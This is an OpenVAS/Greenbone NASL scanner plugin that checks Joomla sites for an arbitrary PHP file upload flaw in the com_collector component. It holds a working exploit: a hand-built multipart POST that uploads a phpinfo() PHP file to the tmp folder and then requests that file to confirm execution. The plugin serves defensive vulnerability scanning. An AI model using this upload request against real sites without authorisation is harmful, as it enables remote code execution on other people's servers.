CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803213" );
	script_version( "$Revision: 11203 $" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-09-03 16:49:51 +0200 (Mon, 03 Sep 2018) $" );
	script_tag( name: "creation_date", value: "2013-01-22 15:07:32 +0530 (Tue, 22 Jan 2013)" );
	script_name( "Joomla! com_collector Component Arbitrary File Upload Vulnerability" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/24228" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to upload arbitrary
  PHP code and run it in the context of the Web server process." );
	script_tag( name: "affected", value: "Joomla! Collector Component" );
	script_tag( name: "insight", value: "The flaw is due to the 'com_collector' component which allows
  to upload files with arbitrary extensions to a folder inside the webroot. This can be exploited to execute
  arbitrary PHP code by uploading a malicious PHP script." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Joomla! with com_collector component and is prone to file
  upload vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
func upload_file( url, file, ex, len ){
	return NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", get_host_name(), "\\r\\n", "Content-Type: multipart/form-data; boundary=---------------------------161994664612503670831257944673\\r\\n", "Content-Length: ", len, "\\r\\n\\r\\n", "-----------------------------161994664612503670831257944673\\r\\n", "Content-Disposition: form-data; name=\"foldername\"\r\n\r\n\r\n", "-----------------------------161994664612503670831257944673\\r\\n", "Content-Disposition: form-data; name=\"fileupload\"; filename=\"", file, "\"\r\n", "Content-Type: application/octet-stream\\r\\n", "\\r\\n", ex, "\\r\\n", "-----------------------------161994664612503670831257944673\\r\\n", "Content-Disposition: form-data; name=\"option\"\r\n\r\n", "com_collector\\r\\n", "-----------------------------161994664612503670831257944673\\r\\n", "Content-Disposition: form-data; name=\"view\"\r\n\r\n", "filelist\\r\\n", "-----------------------------161994664612503670831257944673\\r\\n", "Content-Disposition: form-data; name=\"tmpl\"\r\n\r\n", "component\\r\\n", "-----------------------------161994664612503670831257944673\\r\\n", "Content-Disposition: form-data; name=\"task\"\r\n\r\n", "filemanager.upload\\r\\n", "-----------------------------161994664612503670831257944673\\r\\n", "Content-Disposition: form-data; name=\"folder\"\r\n\r\n", "tmp\\r\\n", "-----------------------------161994664612503670831257944673--\\r\\n\\r\\n" );
}
if(!joomlaPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: joomlaPort )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
rand = rand();
file = NASLString( "ov-upload-test-", rand, ".php" );
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen( ex ) + 949;
url = NASLString( dir, "/index.php?option=com_collector&view=filelist&folder=tmp&tmpl=component" );
req = upload_file( url: url, file: file, ex: ex, len: len );
res = http_keepalive_send_recv( port: joomlaPort, data: req );
if(res){
	path = NASLString( dir, "/tmp/", file );
	sndReq = http_get( item: path, port: joomlaPort );
	rcvRes = http_send_recv( port: joomlaPort, data: sndReq );
	if(rcvRes && IsMatchRegexp( rcvRes, "HTTP/1.. 200" ) && ContainsString( rcvRes, "<title>phpinfo()<" ) && ContainsString( rcvRes, rand )){
		security_message( port: joomlaPort );
		exit( 0 );
	}
}

